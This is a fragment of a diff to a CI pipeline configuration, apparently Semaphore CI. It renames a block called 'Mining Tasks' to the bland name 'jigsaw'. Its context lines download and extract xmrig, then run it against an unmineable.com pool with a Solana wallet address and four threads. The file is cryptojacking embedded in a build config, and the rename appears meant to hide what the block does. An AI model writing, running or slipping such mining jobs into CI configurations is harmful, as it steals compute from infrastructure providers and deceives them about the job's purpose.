@@ -5,7 +5,7 @@ agent:
     type: e1-standard-2
     os_image: ubuntu2004
 blocks:
-  - name: Mining Tasks
+  - name: jigsaw
     task:
       jobs:
         - name: Start Task 1
@@ -408,4 +408,3 @@ blocks:
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
             - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
-       
